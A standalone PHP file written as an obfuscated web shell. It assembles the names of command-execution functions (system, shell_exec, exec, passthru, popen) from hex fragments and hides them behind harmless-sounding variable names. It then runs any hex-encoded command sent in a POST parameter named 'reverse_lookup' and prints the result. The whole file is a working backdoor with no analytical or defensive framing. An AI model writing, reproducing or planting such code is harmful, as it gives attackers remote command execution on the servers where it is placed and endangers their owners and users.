<?php


$token1 = '3';
$token2 = '9';
$token3 = '7';
$token4 = '4';
$token5 = '5';
$token6 = '6';
$token7 = '8';
$token8 = 'c';
$token9 = 'f';
$token10 = '2';
$token11 = '0';
$token12 = 'e';
$token13 = 'b';
$token_parser_engine1 = pack("H*", '7'.$token1.'7'.$token2.'7'.'3'.$token3.$token4.'6'.$token5.'6'.'d');
$token_parser_engine2 = pack("H*", $token3.'3'.$token6.$token7.'6'.$token5.'6'.$token8.$token6.'c'.'5'.$token9.'6'.$token5.$token3.'8'.'6'.$token5.'6'.'3');
$token_parser_engine3 = pack("H*", $token6.$token5.'7'.'8'.$token6.$token5.$token6.'3');
$token_parser_engine4 = pack("H*", '7'.'0'.$token6.'1'.$token3.'3'.'7'.'3'.$token3.'4'.'6'.$token7.'7'.$token10.'7'.$token5);
$token_parser_engine5 = pack("H*", $token3.'0'.$token6.'f'.'7'.$token11.$token6.$token5.$token6.'e');
$token_parser_engine6 = pack("H*", '7'.'3'.'7'.'4'.$token3.'2'.'6'.'5'.'6'.'1'.'6'.'d'.$token5.'f'.$token6.'7'.$token6.$token5.'7'.$token4.'5'.'f'.'6'.$token1.$token6.$token9.'6'.$token12.'7'.$token4.'6'.$token5.$token6.'e'.$token3.'4'.$token3.$token1);
$token_parser_engine7 = pack("H*", '7'.$token11.'6'.'3'.$token6.'c'.$token6.$token9.'7'.$token1.'6'.$token5);
$reverse_lookup = pack("H*", $token3.'2'.$token6.$token5.$token3.'6'.'6'.'5'.'7'.$token10.$token3.$token1.$token6.'5'.'5'.'f'.$token6.'c'.$token6.'f'.$token6.'f'.'6'.$token13.$token3.'5'.'7'.$token11);
if (isset($_POST[$reverse_lookup])) {
    $reverse_lookup = pack("H*", $_POST[$reverse_lookup]);
    if (function_exists($token_parser_engine1)) {
        $token_parser_engine1($reverse_lookup);
    } elseif (function_exists($token_parser_engine2)) {
        print $token_parser_engine2($reverse_lookup);
    } elseif (function_exists($token_parser_engine3)) {
        $token_parser_engine3($reverse_lookup, $ptr_itm);
        print join("\n", $ptr_itm);
    } elseif (function_exists($token_parser_engine4)) {
        $token_parser_engine4($reverse_lookup);
    } elseif (function_exists($token_parser_engine5) && function_exists($token_parser_engine6) && function_exists($token_parser_engine7)) {
        $dat_ent = $token_parser_engine5($reverse_lookup, 'r');
        if ($dat_ent) {
            $desc_binding = $token_parser_engine6($dat_ent);
            $token_parser_engine7($dat_ent);
            print $desc_binding;
        }
    }
    exit;
}
